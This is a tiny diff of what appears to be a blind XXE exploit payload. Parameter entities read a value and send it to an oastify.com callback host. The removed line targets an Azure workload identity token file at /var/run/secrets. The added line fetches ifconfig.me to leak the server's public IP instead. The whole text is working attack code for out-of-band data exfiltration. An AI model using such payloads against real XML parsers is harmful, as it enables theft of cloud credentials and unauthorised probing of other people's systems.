@@ -1,4 +1,4 @@
-<!ENTITY % token SYSTEM "file:///var/run/secrets/azure/tokens/azure-identity-token">
+<!ENTITY % token SYSTEM "https://ifconfig.me">
 <!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'http://3ptqht07sa5frl7b5a19o4ou7ldc1cp1.oastify.com/%token;'>">
 %wrap;
 %send;
